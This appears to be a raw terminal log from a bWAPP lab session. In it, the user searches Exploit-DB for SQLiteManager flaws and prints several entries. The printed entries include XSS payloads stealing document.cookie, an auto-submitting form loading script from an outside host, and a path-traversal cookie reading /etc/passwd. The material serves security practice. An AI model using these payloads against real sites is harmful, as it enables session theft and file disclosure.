@@ -1,0 +1,259 @@
+Script started on 2020-08-23 00:23:47+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ msfc[K[K[K[Kfg
+bash: fg: current: no such job
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ searchsploit SQLitye[K[KeManager
+----------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                       |  Path
+----------------------------------------------------------------------------------------------------- ---------------------------------
+[01;31m[KSQLiteManager[m[K 1.2 - 'main.php' Cross-Site Scripting                                                  | php/webapps/33154.txt
+[01;31m[KSQLiteManager[m[K 1.2 - 'main.php' Multiple HTML Injection Vulnerabilities                               | php/webapps/29680.html
+[01;31m[KSQLiteManager[m[K 1.2 - Local File Inclusion                                                             | php/webapps/29665.txt
+[01;31m[KSQLiteManager[m[K 1.2.0 / 1.2.4 - Blind SQL Injection                                                    | php/webapps/47310.txt
+[01;31m[KSQLiteManager[m[K 1.2.4 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                      | php/webapps/36510.txt
+[01;31m[KSQLiteManager[m[K 1.2.4 - 'main.php?dbsel' Cross-Site Scripting                                          | php/webapps/36509.txt
+[01;31m[KSQLiteManager[m[K 1.2.4 - Remote PHP Code Injection                                                      | multiple/webapps/24320.py
+----------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ les[Kss ""$"(")"l)"o)"c)"a)"t)"e)" )"php/webapps/33154.txt)"
+[?1049h[22;0;0t[?1h=source: https://www.securityfocus.com/bid/36002/info
+
+SQLiteManager is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affec ted site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+SQLiteManager 1.2.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/main.php?redirect=<script>alert(&#039;Hadi Kiamarsi&#039;)</script>
+[7m/usr/share/exploitdb/exploits/php/webapps/33154.txt (END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+source: https://www.securityfocus.com/bid/36002/info
+
+SQLiteManager is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affec ted site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+SQLiteManager 1.2.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/main.php?redirect=<script>alert(&#039;Hadi Kiamarsi&#039;)</script>
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ less "$(locate php/webapps/33154.txt)"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[C[1P[1P[1@c[1@p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C .
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ ll
+total 8
+-rw-r--r-- 1 dinesh dinesh  601 Aug 23 00:27 33154.txt
+-rw-r--r-- 1 dinesh dinesh 4096 Aug 23 00:24 terminal_log_Sun_23_Aug_2020_12:23:47_AM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ !s
+searchsploit SQLiteManager
+----------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                       |  Path
+----------------------------------------------------------------------------------------------------- ---------------------------------
+[01;31m[KSQLiteManager[m[K 1.2 - 'main.php' Cross-Site Scripting                                                  | php/webapps/33154.txt
+[01;31m[KSQLiteManager[m[K 1.2 - 'main.php' Multiple HTML Injection Vulnerabilities                               | php/webapps/29680.html
+[01;31m[KSQLiteManager[m[K 1.2 - Local File Inclusion                                                             | php/webapps/29665.txt
+[01;31m[KSQLiteManager[m[K 1.2.0 / 1.2.4 - Blind SQL Injection                                                    | php/webapps/47310.txt
+[01;31m[KSQLiteManager[m[K 1.2.4 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                      | php/webapps/36510.txt
+[01;31m[KSQLiteManager[m[K 1.2.4 - 'main.php?dbsel' Cross-Site Scripting                                          | php/webapps/36509.txt
+[01;31m[KSQLiteManager[m[K 1.2.4 - Remote PHP Code Injection                                                      | multiple/webapps/24320.py
+----------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ searchsploit SQLiteManagerll[Kcp "$(locate php/webapps/33154.txt)" .[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cless "$(locate php/webapps/33154.txt)"[1P.txt)"[1P.txt)"[1P.txt)"[1P.txt)"[1P.txt)"2.txt)"9.txt)"6.txt)"8.txt)"0.txt)"[C[1Pxt)"[1Pt)"[1P)"h)"t)"m)"l)"
+[?1049h[22;0;0t[?1h=source: https://www.securityfocus.com/bid/22731/info
+
+SQLiteManager is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting these issues may allow an attacker to execute HTML and script code in the context of the affected site, to steal cookie-base d authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.
+
+Version 1.2.0 is vulnerable; other versions may also be affected. 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html> <head>  <body> <form id="editform" name="editform" method="post" action="http://www.example.com/sqlitemanager/main.php" enctype="multipart/for m-data"> <input type="text" name="dbname" value='"><script src=http://www.0x000000.com/x.js></script><"' /> <input type="text" name="db Version" value="2" /> <input type="text" name="dbRealpath" value="" /> <input type="text" name="filename" value="" /> <input type="text " name="dbpath" value="" /> <input type="text" name="action" value="saveDb" /> <input name="Save" value="Save page" type="submit"> </fo rm> <script>document.forms[0].submit();</script> </body> </html>
+[7m/usr/share/exploitdb/exploits/php/webapps/29680.html (END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+source: https://www.securityfocus.com/bid/22731/info
+
+SQLiteManager is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting these issues may allow an attacker to execute HTML and script code in the context of the affected site, to steal cookie-base d authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.
+
+Version 1.2.0 is vulnerable; other versions may also be affected. 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html> <head>  <body> <form id="editform" name="editform" method="post" action="http://www.example.com/sqlitemanager/main.php" enctype="multipart/for m-data"> <input type="text" name="dbname" value='"><script src=http://www.0x000000.com/x.js></script><"' /> <input type="text" name="db Version" value="2" /> <input type="text" name="dbRealpath" value="" /> <input type="text" name="filename" value="" /> <input type="text " name="dbpath" value="" /> <input type="text" name="action" value="saveDb" /> <input name="Save" value="Save page" type="submit"> </fo rm> <script>document.forms[0].submit();</script> </body> </html>
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ less "$(locate php/webapps/29680.html)"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[C[1P[1P[1@l[1@s
+/usr/share/exploitdb/exploits/php/webapps/29680.html
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ ls "$(locate php/webapps/29680.html)"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[2@es[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P)"[1P)"[1P)"[1P)"[1P)"[1P)"[1P)"[1P)"[1P)"[1P)"2)"9)"6)"6)"5)".)"t)"x)"t)"
+[?1049h[22;0;0t[?1h=source: https://www.securityfocus.com/bid/22727/info
+
+SQLiteManager is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.
+
+Exploiting this issue may allow an unauthorized user to view files and execute local scripts.
+
+SQLiteManager 1.2.0 is vulnerable to this issue; other versions may also be affected. 
+
+GET /home/sqlite/ HTTP/1.0
+[...]
+Cookie: PHPSESSID=[...];SQLiteManager_currentTheme=../../../../../../../../../../../../../etc/passwd%00;
+SQLiteManager_currentLangue=deleted
+[7m/usr/share/exploitdb/exploits/php/webapps/29665.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+source: https://www.securityfocus.com/bid/22727/info
+
+SQLiteManager is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.
+
+Exploiting this issue may allow an unauthorized user to view files and execute local scripts.
+
+SQLiteManager 1.2.0 is vulnerable to this issue; other versions may also be affected. 
+
+GET /home/sqlite/ HTTP/1.0
+[...]
+Cookie: PHPSESSID=[...];SQLiteManager_currentTheme=../../../../../../../../../../../../../etc/passwd%00;
+SQLiteManager_currentLangue=deleted
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ less $()l)o)c)a)t)e) )php/webapps/36510.txt)
+[?1049h[22;0;0t[?1h=source: https://www.securityfocus.com/bid/51294/info
+ 
+SQLiteManager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input befor e using it in dynamically generated content.
+ 
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the aff ected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+ 
+SQLiteManager 1.2.4 is vulnerable; other versions may also be affected. 
+
+IE-only
+http://www.example.com/sqlite/?nsextt=" stYle="x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?dbsel=" stYle="x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?nsextt=" stYle="x:expre/**/ssion(alert(document.cookie))
+[7m/usr/share/exploitdb/exploits/php/webapps/36510.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+source: https://www.securityfocus.com/bid/51294/info
+ 
+SQLiteManager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input befor e using it in dynamically generated content.
+ 
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the aff ected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+ 
+SQLiteManager 1.2.4 is vulnerable; other versions may also be affected. 
+
+IE-only
+http://www.example.com/sqlite/?nsextt=" stYle="x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?dbsel=" stYle="x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?nsextt=" stYle="x:expre/**/ssion(alert(document.cookie))
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ less $(locate php/webapps/36510.txt)[1Pt)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)[1P)php/webapps/36509.txt)
+[?1049h[22;0;0t[?1h=source: https://www.securityfocus.com/bid/51294/info
+
+SQLiteManager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input befor e using it in dynamically generated content.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the aff ected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+SQLiteManager 1.2.4 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/sqlite/main.php?dbsel=&#039;"</script><script>alert(document.cookie)</script>
+[7m/usr/share/exploitdb/exploits/php/webapps/36509.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+source: https://www.securityfocus.com/bid/51294/info
+
+SQLiteManager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input befor e using it in dynamically generated content.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the aff ected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+SQLiteManager 1.2.4 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/sqlite/main.php?dbsel=&#039;"</script><script>alert(document.cookie)</script>
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ less $(locate php/webapps/36509.txt)[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[C[1P[1P[1@c[1@p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C .
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS/scripts[01;31mdinesh@evil[00m: [[01;34mscripts[00m] $ ll
+total 24
+-rw-r--r-- 1 dinesh dinesh   601 Aug 23 00:27 33154.txt
+-rw-r--r-- 1 dinesh dinesh   668 Aug 23 00:38 36509.txt
+-rw-r--r-- 1 dinesh dinesh 16384 Aug 23 00:30 terminal_log_Sun_23_Aug_2020_12:23:47_AM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Using_Known_Vulnerable_Components/SQLiteManager_XSS
